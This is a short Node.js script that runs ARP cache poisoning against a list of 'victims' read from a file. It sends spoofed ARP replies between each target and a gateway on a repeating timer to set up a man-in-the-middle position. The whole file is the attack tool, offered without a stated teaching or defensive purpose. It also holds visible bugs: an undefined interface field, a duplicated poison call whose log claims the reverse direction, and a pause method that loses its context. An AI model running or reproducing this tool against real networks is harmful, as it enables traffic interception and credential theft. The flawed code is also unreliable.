const fs = require('fs');
const arp = require('arpjs');

const IFACE = process.argv[2];
const GATEWAY = process.argv[3];
const FILEPATH = process.argv[4] || './victims.txt';

// prelim!

class Attack {
  constructor(packetInterval) {
    this.packetInterval = packetInterval || 2000; // recommended every 10 sec
  }

  start(iface, gateway, filepath) {
    if (!iface) {
      throw Error('dude, include an interface');
    } else {
      arp.setInterface(this.iface);
    }
    if (!gateway || !filepath) {
      throw Error('dude, include a gateway!');
    } else {
      this.targets = fs
        .readFileSync(filepath)
        .toString()
        .split('\n')
        .filter(ip => ip !== '');
    }
    if (!this.targets.length) throw new Error('Gather(.sh) some victims!');

    this.stop();

    this.runningAttack = setInterval(() => {
      this.targets.forEach(target => {
        console.log('Sending ARP Reply to', target, 'from', gateway);
        arp.poison(target, gateway);
        console.log('Sending ARP Reply to', gateway, 'from', target);
        arp.poison(target, gateway);
      });
    }, this.packetInterval);

    return this; // for method chaining
  }

  pause(ms) {
    this.stop();
    setTimeout(this.start, ms || 5000);
    return this; // for method chaining
  }

  stop() {
    clearInterval(this.runningAttack);
    return this; // for method chaining
  }
}

const attack = new Attack(2000);
attack.start(IFACE, GATEWAY, FILEPATH);
